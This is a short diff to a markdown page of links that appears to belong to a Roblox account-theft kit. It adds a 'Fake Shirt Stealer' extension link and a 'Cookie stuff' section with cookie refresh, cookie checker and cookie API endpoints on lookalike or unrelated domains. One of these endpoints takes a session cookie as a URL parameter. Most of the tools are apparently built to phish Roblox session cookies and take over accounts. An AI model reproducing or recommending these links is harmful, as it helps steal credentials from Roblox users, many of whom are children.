@@ -15,18 +15,14 @@
 
 [Fake Game Copy Gen](https://robloxapi.eu/gameapi/)
 
-
 ### Extension Gen links
 
-[Game Discover](https://apk-roblox.com/discover)
-[Cookie Bypasser 1](https://roblox.com.sc/generator/reflesher)
+[Extension Method Fake Shirt Stealer](https://robloxapi.eu/shirt-steal/)
 
-### Cookie IP Refresh
-
-### Cookie Checker
-
-### User Info API
-
+### Cookie stuff
+[Cookie IP Refresh](https://story-of-jesus.xyz/refresh/toxins-domain.php)
+[Cookie Checker](https://story-of-jesus.xyz/checker/toxinsdomain.php)
+[Cookie API (Enter cookie in link)](https://story-of-jesus.xyz/api/toxinsdomain.php?cookie=EnterCookieHere)
 
 
 ## [Join Discord Server](https://discord.gg/R9K9gg8HPZ)
